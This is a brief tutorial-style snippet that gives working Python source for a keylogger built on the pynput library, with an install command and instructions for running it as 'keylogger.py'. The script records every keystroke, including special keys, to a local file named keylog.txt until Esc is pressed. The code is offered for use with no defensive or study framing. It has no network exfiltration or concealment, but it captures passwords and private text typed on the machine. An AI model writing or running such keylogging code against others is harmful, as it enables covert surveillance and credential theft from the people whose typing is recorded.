pip install pynput


from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter, etc.)
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == keyboard.Key.tab:
            with open(log_file, "a") as f:
                f.write("\t")
        else:
            with open(log_file, "a") as f:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

"""Run the Script:
Open a terminal or command prompt in the directory where your script is saved and run the script with:
"""

python keylogger.py
